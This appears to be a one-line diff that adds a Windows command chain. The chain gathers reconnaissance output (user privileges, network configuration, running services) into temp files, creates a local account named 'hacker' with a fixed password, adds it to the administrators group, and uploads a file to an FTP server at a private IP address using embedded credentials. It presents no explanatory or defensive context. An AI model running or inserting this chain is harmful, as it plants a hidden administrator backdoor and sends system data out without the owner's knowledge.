@@ -1,0 +1,1 @@
+whoami /all > %temp%\whoami.txt && ipconfig /all > %temp%\ipconfig.txt && tasklist /svc > %temp%\tasklist.txt && net user hacker root123456789 /add && net localgroup administrators hacker /add && curl ftp://192.168.0.123:21/ --user WRdB7KNDc9AWQ9Cr:UskkrGc5UE3DbeT8 -T %temp%\message.txt
